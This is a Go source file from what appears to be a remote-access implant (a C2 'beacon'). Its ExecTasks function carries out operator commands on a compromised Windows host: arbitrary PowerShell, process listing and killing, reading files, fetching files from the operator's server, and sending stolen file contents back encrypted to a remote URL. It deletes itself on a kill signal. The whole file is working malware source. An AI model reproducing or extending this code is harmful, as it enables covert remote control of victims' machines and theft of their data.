package check

import (
	"bytes"
	"dingo/initialization"
	"dingo/tasks"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"path"
	"strings"

	hg "github.com/deranged0tter/hellsgopher"
	selfdelete "github.com/secur30nly/go-self-delete"
)

func ExecTasks(tasksToDo []string, sleep *int, agentid string, useragent string, key []byte, beacon_name string, rhost string, url string) {
	for _, task := range tasksToDo {
		var data string

		taskSplit := strings.Split(task, " - ")
		task = taskSplit[0]
		taskData := taskSplit[1]

		fmt.Println(task)

		switch task {
		case "shell":
			data, _ = hg.PsReturn(taskData)
		case "whoami":
			data, _ = initialization.GetUsername()
		case "hostname":
			data, _ = hg.GetHostname()
		case "ps":
			data, _ = hg.PsReturn("tasklist")
		case "ifconfig":
			data, _ = hg.PsReturn("ipconfig")
		case "kill":
			pid := taskData
			hg.PsNoOut("Stop-Process -Id " + pid)
			data = fmt.Sprintf("killed process (%s)", pid)
		case "cat":
			data, _ = hg.PsReturn("type " + taskData)
		case "upload":
			taskDataSplit := strings.Split(taskData, " ")
			uFile := taskDataSplit[0]
			dPath := taskDataSplit[1]

			url := fmt.Sprintf("http://%s:4458/files/%s", rhost, uFile)

			err := hg.DownFile(url, dPath)
			if err != nil {
				data = err.Error()
				break
			}

			data = "successfully uploaded file"
		case "download":
			data = "successfully download file"
			data += " //SPLIT// "
			data += path.Base(taskData)
			data += " //END NAME// "
			fileData, _ := hg.ReadFileToString(taskData)
			data += fileData
		}

		if !strings.Contains(data, " //SPLIT// ") {
			data += " //SPLIT// "
		}

		rawJsonData := tasks.HttpTaskPostRequest{
			Task: task,
			Data: data,
		}

		jsonData, _ := json.Marshal(rawJsonData)
		jsonDataEncrypted, _ := initialization.EncryptString(key, string(jsonData))

		client := &http.Client{}
		req, _ := http.NewRequest("POST", url, bytes.NewBuffer([]byte(jsonDataEncrypted)))

		req.Header.Add("AgentID", agentid)
		req.Header.Add("CallType", "Task")
		req.Header.Set("User-Agent", useragent)
		req.Header.Add("SLEEP", fmt.Sprint(*sleep))
		req.Header.Add("Name", beacon_name)

		client.Do(req)

		// kill self if die command used
		if data == "died" {
			selfdelete.SelfDeleteExe()
			os.Exit(2)
		}
	}
}
